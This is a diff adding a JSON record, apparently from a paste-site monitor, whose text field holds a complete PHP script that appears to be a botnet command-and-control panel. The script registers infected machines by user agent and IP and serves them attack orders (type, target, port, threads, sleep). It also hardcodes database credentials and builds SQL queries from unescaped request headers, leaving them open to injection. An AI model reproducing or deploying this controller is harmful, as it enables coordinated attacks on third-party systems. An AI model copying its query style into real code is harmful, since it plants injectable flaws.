@@ -1,0 +1,15 @@
+{
+ "espireDate": "N",
+ "format": "text",
+ "jSonReasons": [
+  "kw_target",
+  "re_sql",
+  "lg_en"
+ ],
+ "key": "LFVmx0NX",
+ "pasteDate": "Feb 18, 2018, 11:13:06 AM",
+ "relevancy": 0.0,
+ "relevant": false,
+ "text": "<?\n$hwid=$_SERVER['HTTP_USER_AGENT'];\n//$hwid=$_POST['hwid'];\n$ip=$_SERVER['REMOTE_ADDR'];\n\nif($hwid)\n{\n\t$conn=mysql_connect(\"mysql1.jatvoidomtrubashatal.in\",\"trubashatal\",\"asdssssy\") or die(mysql_error());\n\tmysql_select_db(\"trubashatal\");\n\t$res=mysql_query(\"select * from `bender_list` where `hwid`='\".$hwid.\"'\");\n\tif(mysql_num_rows($res))\n\t{\n\t\t$res=mysql_query(\"update `bender_list` set `status`='5' where `hwid`='\".$hwid.\"'\");\n\t}\n\telse\n\t{\n\t\t$res=mysql_query(\"select max(id) as counter from `bender_list`\");\n\t\t$res_arr=mysql_fetch_array($res);\n\t\t$id=$res_arr['counter'];\n\t\t$id=$id+1;\n\t\t$res=mysql_query(\"insert into `bender_list` set `hwid`='\".$hwid.\"', `last_ip`='\".$ip.\"', `status`=5, `id`=\".$id);\n\t}\n}\n$conn=mysql_connect(\"mysql1.jatvoidomtrubashatal.in\",\"trubashatal\",\"asdssssy\") or die(mysql_error());\nmysql_select_db(\"trubashatal\");\n$res=mysql_query(\"select * from `todo` where `id`>0\",$conn);\n$res_arr=mysql_fetch_array($res);\necho \"Status=\".$res_arr['status'].\"\n\";\necho \"Type=\".$res_arr['type'].\"\n\";\necho \"Target=\".$res_arr['target'].\"\n\";\necho \"Port=\".$res_arr['port'].\"\n\";\necho \"Thread=\".$res_arr['thread'].\"\n\";\necho \"Sleep=\".$res_arr['sleep'].\"\n\";\n\n\n\n\n\n\n\n\n\n\n\n?>",
+ "title": ""
+}
